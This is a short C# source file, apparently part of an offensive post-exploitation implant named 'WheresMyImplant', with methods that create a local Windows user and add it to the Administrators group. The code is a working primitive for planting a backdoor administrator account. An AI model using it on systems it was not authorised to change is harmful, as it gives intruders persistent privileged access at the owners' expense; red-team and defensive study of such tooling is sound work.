using System;
using System.DirectoryServices;

namespace WheresMyImplant
{
    class AddUser
    {
        internal AddUser()
        {
        }

        internal void AddLocalUser(String username, String password)
        {
            DirectoryEntry computer = new DirectoryEntry(String.Format("WinNT://{0}/,computer", Environment.MachineName));
            DirectoryEntry user = computer.Children.Add(username, "user");
            user.Invoke("SetPassword", password);
            user.CommitChanges();
        }

        internal void AddLocalAdmin(String username, String password)
        {
            DirectoryEntry computer = new DirectoryEntry(String.Format("WinNT://{0}/,computer", Environment.MachineName));
            DirectoryEntry user = computer.Children.Add(username, "user");
            user.Invoke("SetPassword", password);
            user.CommitChanges();

            DirectoryEntry group = computer.Children.Find("Administrators");
            group.Invoke("Add", user.Path);
            group.CommitChanges();
        }
    }
}